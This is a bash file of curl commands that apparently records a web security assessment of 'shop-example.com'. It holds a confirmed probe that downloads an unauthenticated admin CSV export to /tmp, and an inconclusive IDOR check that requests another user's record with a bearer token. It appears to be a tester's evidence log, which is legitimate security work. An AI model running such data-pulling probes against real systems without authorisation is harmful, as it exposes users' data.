#!/bin/bash
# curl commands — shop-example.com — every probe beside its baseline.
# Finding 1: GET /v1/admin/export — unauthenticated CSV export (CONFIRMED)
# Baseline (known-dead path on same host):
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
  "https://shop-example.com/v1/admin/nope"
# Probe (run 2x, fresh session each time):
curl -s -D - "https://shop-example.com/v1/admin/export" -o /tmp/export1.csv
curl -s -D - "https://shop-example.com/v1/admin/export" -o /tmp/export2.csv
# Lead 2: GET /v2/users/{id} — IDOR check (INCONCLUSIVE, needs session)
# Baseline: own id vs other id with low-priv session token <TOKEN>
curl -s "https://api.shop-example.com/v2/users/me" -H "Authorization: Bearer <TOKEN>"
curl -s "https://api.shop-example.com/v2/users/1" -H "Authorization: Bearer <TOKEN>"
